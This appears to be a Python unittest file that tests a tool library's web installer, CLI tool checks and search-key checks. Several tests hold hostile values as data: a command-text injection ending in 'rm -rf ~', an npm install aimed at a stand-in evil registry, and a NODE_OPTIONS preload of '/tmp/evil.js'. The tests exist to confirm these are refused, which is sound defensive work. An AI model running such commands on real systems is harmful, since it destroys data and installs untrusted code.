"""63 号单：网上安装执行、普通工具检测、联网搜索检测。

依据：docs/积木库/沙盒接入/方案.md 技术设计“执行”“普通工具检测”“搜索检测”。
安装用假的 npm、假的脚本（临时文件夹里的小程序），不真装东西、不联网。
"""
import os
import stat
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from collab import blocks, blocks_check, blocks_install, blocks_web
from collab.blocks import BlockError


def write_exe(folder: Path, name: str, body: str) -> Path:
    path = folder / name
    path.write_text("#!/bin/sh\n" + body, encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    return path


class Case(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.root = self.tmp / "积木库"
        self.bin = self.tmp / "bin"
        self.bin.mkdir()
        self.path = f"{self.bin}:/usr/bin:/bin"

    def tearDown(self):
        self._tmp.cleanup()


def npm_spec(pkg="@demo/tool", command="demo-tool"):
    spec = blocks_web.parse_install(f"npm install -g {pkg}")
    return dict(spec, source="https://demo.example.com/install", domain="demo.example.com", command=command,
                package={"exists": True}, found_by="page", danger=False)


def script_spec(command="demo-tool", shell="sh"):
    spec = blocks_web.parse_install(f"curl -fsSL https://demo.example.com/install.sh | {shell}")
    return dict(spec, source="https://demo.example.com/docs", domain="demo.example.com", command=command,
                package=None, found_by="page", danger=True)


class WebInstallNpm(Case):
    def fake_npm(self, body):
        write_exe(self.bin, "npm", body)

    def test_success_and_record(self):
        # 假 npm：在 prefix/bin 里放出 demo-tool
        self.fake_npm('mkdir -p "$npm_config_prefix/bin"; printf "#!/bin/sh\\n" > "$npm_config_prefix/bin/demo-tool"; '
                      'chmod +x "$npm_config_prefix/bin/demo-tool"; echo "args:$*"\n')
        prefix = str(self.tmp / "prefix")
        result = blocks_install.run_web_install(npm_spec(), root=self.root, path=self.path, prefix=prefix)
        self.assertTrue(result["ok"], result)
        self.assertEqual(result["status"], "ok")
        self.assertTrue(result["found"])
        rec = blocks.last_record("demo-tool", self.root, type="install")
        self.assertEqual(rec["source"], "https://demo.example.com/install")
        self.assertEqual(rec["how_installed"], "npm install -g @demo/tool")

    def test_args_come_from_reparsing_not_from_stored_args(self):
        self.fake_npm('echo "$*" > "%s/got"\n' % self.tmp)
        spec = npm_spec()
        spec["args"] = ["npm", "install", "-g", "evil-pkg", "--registry=https://evil.example.com"]
        blocks_install.run_web_install(spec, root=self.root, path=self.path, record=False)
        self.assertEqual((self.tmp / "got").read_text().strip(), "install -g @demo/tool")

    def test_tampered_command_text_refused(self):
        spec = npm_spec()
        spec["command_text"] = "npm install -g x && rm -rf ~"
        with self.assertRaises(BlockError):
            blocks_install.run_web_install(spec, root=self.root, path=self.path)

    def test_missing_npm(self):
        result = blocks_install.run_web_install(npm_spec(), root=self.root, path=str(self.bin), record=False)
        self.assertEqual(result["status"], "missing_prereq")

    def test_needs_admin(self):
        self.fake_npm('echo "npm ERR! code EACCES"; exit 243\n')
        result = blocks_install.run_web_install(npm_spec(), root=self.root, path=self.path, record=False)
        self.assertEqual(result["status"], "needs_admin")

    def test_already_installed(self):
        write_exe(self.bin, "demo-tool", "exit 0\n")
        self.fake_npm("exit 1\n")
        result = blocks_install.run_web_install(npm_spec(), root=self.root, path=self.path, record=False)
        self.assertEqual(result["status"], "already")

    def test_bad_command_name(self):
        with self.assertRaises(BlockError):
            blocks_install.run_web_install(npm_spec(command="../x"), root=self.root, path=self.path)


class WebInstallScript(Case):
    def setUp(self):
        super().setUp()
        self.home = self.tmp / "home"
        self.home.mkdir()

    def run_script(self, script: str, **kw):
        with mock.patch.object(blocks_install, "_download_script", return_value=script.encode()) as dl, \
                mock.patch.dict(os.environ, {"HOME": str(self.home)}):
            result = blocks_install.run_web_install(script_spec(**kw), root=self.root, path=self.path, record=False)
        return result, dl

    def test_downloaded_then_run_and_found_in_local_bin(self):
        script = ('mkdir -p "$HOME/.local/bin"; printf "#!/bin/sh\\n" > "$HOME/.local/bin/demo-tool"; '
                  'chmod +x "$HOME/.local/bin/demo-tool"; echo installed\n')
        result, dl = self.run_script(script)
        dl.assert_called_once_with("https://demo.example.com/install.sh")
        self.assertTrue(result["ok"], result)
        self.assertTrue(result["found"])

    def test_script_env_is_minimal(self):
        script = 'env > "%s/env.txt"\n' % self.tmp
        with mock.patch.dict(os.environ, {"NODE_OPTIONS": "--require /tmp/evil.js", "SECRET_THING": "x"}):
            self.run_script(script)
        env = (self.tmp / "env.txt").read_text()
        self.assertNotIn("NODE_OPTIONS", env)
        self.assertNotIn("SECRET_THING", env)
        self.assertIn("HOME=", env)

    def test_bash_used_when_page_says_bash(self):
        script = 'echo "$BASH_VERSION" > "%s/shell.txt"\n' % self.tmp
        self.run_script(script, shell="bash")
        self.assertTrue((self.tmp / "shell.txt").read_text().strip(), "要用 bash 跑")

    def test_password_prompt_means_stop(self):
        result, _ = self.run_script('echo "Password:"; echo "sudo: a password is required"; exit 1\n')
        self.assertEqual(result["status"], "needs_admin")

    def test_failure_reason(self):
        result, _ = self.run_script('echo "boom"; exit 3\n')
        self.assertEqual(result["status"], "fail")
        self.assertIn("boom", result["how"])

    def test_download_refuses_private_and_big(self):
        with mock.patch.object(blocks_web, "_resolve", return_value=["127.0.0.1"]):
            with self.assertRaises(BlockError):
                blocks_install._download_script("https://inside.example.com/i.sh")
        with mock.patch.object(blocks_web, "_resolve", return_value=["93.184.216.34"]), \
                mock.patch.object(blocks_web, "_open", return_value=(200, "", b"x" * (blocks_install.SCRIPT_LIMIT + 5))):
            with self.assertRaises(BlockError):
                blocks_install._download_script("https://demo.example.com/i.sh")

    def test_one_install_at_a_time(self):
        with blocks_install._lock:
            blocks_install._busy["on"] = True
        try:
            with self.assertRaises(BlockError):
                self.run_script("exit 0\n")
        finally:
            with blocks_install._lock:
                blocks_install._busy["on"] = False


def tool_card(**over):
    card = {"id": "maptool", "kind": "cli", "role": "tool", "name": "地图工具", "command": "map-tool",
            "probe": ["search", "--keyword", "天安门"], "version_args": [],
            "secrets": [{"env": "MAP_KEY", "label": "Key"}]}
    card.update(over)
    return card


class ToolCheck(Case):
    def keys(self, value="map-secret-123456"):
        return {blocks.secret_account("maptool", "MAP_KEY"): value}

    def approved(self, card):
        return blocks_check.preview(card, path=self.path)

    def test_preview_shows_full_probe_path(self):
        write_exe(self.bin, "map-tool", "exit 0\n")
        self.assertEqual(self.approved(tool_card()), f"{self.bin}/map-tool search --keyword '天安门'")

    def test_ok_with_key_passed_as_env_and_masked(self):
        write_exe(self.bin, "map-tool", 'test "$MAP_KEY" = "map-secret-123456" || exit 9; echo "{\\"success\\": true}"\n')
        card = tool_card(ok_words=["success"])
        result = blocks_check.check_cli(card, root=self.root, approved=self.approved(card), path=self.path,
                                        keys=self.keys())
        self.assertTrue(result["ok"], result)
        rec = blocks.last_record("maptool", self.root, type="check")
        self.assertTrue(rec["ok"])

    def test_fail_output_masks_key(self):
        write_exe(self.bin, "map-tool", 'echo "bad key $MAP_KEY"; exit 1\n')
        card = tool_card()
        result = blocks_check.check_cli(card, root=self.root, approved=self.approved(card), path=self.path,
                                        keys=self.keys())
        self.assertFalse(result["ok"])
        self.assertNotIn("map-secret-123456", str(result))
        self.assertNotIn("map-secret-123456", (self.root / "记录" / "maptool.jsonl").read_text())

    def test_ok_words_missing_is_fail(self):
        write_exe(self.bin, "map-tool", 'echo "{\\"success\\": false}"; exit 0\n')
        card = tool_card(ok_words=["\"success\": true"])
        result = blocks_check.check_cli(card, root=self.root, approved=self.approved(card), path=self.path,
                                        keys=self.keys())
        self.assertFalse(result["ok"])

    def test_missing_key_refused_before_running(self):
        write_exe(self.bin, "map-tool", 'touch "%s/ran"\n' % self.tmp)
        card = tool_card()
        with self.assertRaises(BlockError) as ctx:
            blocks_check.check_cli(card, root=self.root, approved=self.approved(card), path=self.path, keys={})
        self.assertIn("Key", str(ctx.exception))
        self.assertFalse((self.tmp / "ran").exists())

    def test_needs_approval_of_exact_command(self):
        write_exe(self.bin, "map-tool", 'touch "%s/ran"\n' % self.tmp)
        card = tool_card()
        with self.assertRaises(BlockError):
            blocks_check.check_cli(card, root=self.root, approved="map-tool search", path=self.path, keys=self.keys())
        self.assertFalse((self.tmp / "ran").exists())

    def test_runs_in_empty_temp_folder_and_env_limited(self):
        write_exe(self.bin, "map-tool", 'pwd > "%s/cwd"; env > "%s/env"; exit 0\n' % (self.tmp, self.tmp))
        card = tool_card(secrets=None)
        del card["secrets"]
        with mock.patch.dict(os.environ, {"NODE_OPTIONS": "--require /tmp/x.js"}):
            blocks_check.check_cli(card, root=self.root, approved=self.approved(card), path=self.path)
        self.assertIn("积木库检测", (self.tmp / "cwd").read_text())
        self.assertNotIn("NODE_OPTIONS", (self.tmp / "env").read_text())

    def test_missing_program(self):
        card = tool_card()
        result = blocks_check.check_cli(card, root=self.root, approved=self.approved(card), path=self.path,
                                        keys=self.keys())
        self.assertEqual(result["status"], "missing")

    def test_timeout(self):
        write_exe(self.bin, "map-tool", "sleep 5\n")
        card = tool_card()
        result = blocks_check.check_cli(card, root=self.root, approved=self.approved(card), path=self.path,
                                        keys=self.keys(), timeout=0.5)
        self.assertFalse(result["ok"])
        self.assertIn("超时", result["reason"])

    def test_agent_check_unchanged(self):
        write_exe(self.bin, "codex", 'echo OK > 连通检测.txt\n')
        card = blocks.builtin_card("codex")
        result = blocks_check.check_cli(card, root=self.root, path=self.path,
                                        runner=lambda a, f, t: ((Path(f) / "连通检测.txt").write_text("OK"), (0, ""))[1])
        self.assertTrue(result["ok"])


class SearchCheck(Case):
    def test_ok(self):
        with mock.patch.object(blocks_web, "search", return_value=[{"url": "https://x.com"}]) as s:
            result = blocks_check.check_search(blocks.search_card("tavily"), "tvly-abc", root=self.root)
        self.assertTrue(result["ok"])
        self.assertEqual(s.call_args[0][1], "tvly-abc")
        self.assertTrue(blocks.last_record("web-search", self.root, type="check")["ok"])

    def test_bad_key_and_quota(self):
        for status, expect in ((401, "fail"), (432, "quota"), (429, "quota")):
            err = blocks_web.SearchError("说法", status)
            with mock.patch.object(blocks_web, "search", side_effect=err):
                result = blocks_check.check_search(blocks.search_card("tavily"), "tvly-abc", root=self.root,
                                                   record=False)
            self.assertEqual(result["status"], expect)
            self.assertNotIn("tvly-abc", str(result))

    def test_needs_key(self):
        with self.assertRaises(BlockError):
            blocks_check.check_search(blocks.search_card("tavily"), "", root=self.root)

    def test_only_search_cards(self):
        with self.assertRaises(BlockError):
            blocks_check.check_search(blocks.builtin_card("codex"), "tvly-abc", root=self.root)


if __name__ == "__main__":
    unittest.main()


class ReviewFixes(Case):
    """独立复查（2026-11-09）查出的问题，先写测试。"""

    def test_key_across_cut_point_is_not_leaked(self):
        key = "ZZZZZZZZZZZZZZZZZZZZZZZZ"
        write_exe(self.bin, "map-tool", 'echo "%s bad key $MAP_KEY"; exit 1\n' % ("x" * 100))
        card = tool_card()
        result = blocks_check.check_cli(card, root=self.root, approved=blocks_check.preview(card, path=self.path),
                                        path=self.path, keys={blocks.secret_account("maptool", "MAP_KEY"): key})
        self.assertNotIn("ZZZZ", str(result), "密钥跨在截断位置上，也不能漏出半截")
        self.assertNotIn("ZZZZ", (self.root / "记录" / "maptool.jsonl").read_text())

    def test_command_name_with_underscore_records_fine(self):
        write_exe(self.bin, "npm", 'mkdir -p "$npm_config_prefix/bin"; printf "#!/bin/sh\\n" > "$npm_config_prefix/bin/my_tool"; '
                                   'chmod +x "$npm_config_prefix/bin/my_tool"\n')
        result = blocks_install.run_web_install(npm_spec(command="my_tool"), root=self.root, path=self.path,
                                                prefix=str(self.tmp / "prefix"))
        self.assertTrue(result["ok"], result)

    def test_tool_timeout_kills_whole_group(self):
        marker = self.tmp / "child-alive"
        write_exe(self.bin, "map-tool", '(sleep 2; touch "%s") & sleep 5\n' % marker)
        card = tool_card()
        blocks_check.check_cli(card, root=self.root, approved=blocks_check.preview(card, path=self.path), path=self.path,
                               keys={blocks.secret_account("maptool", "MAP_KEY"): "k" * 10}, timeout=0.5, record=False)
        import time
        time.sleep(2.5)
        self.assertFalse(marker.exists(), "超时后它另开的进程也要一起关掉")
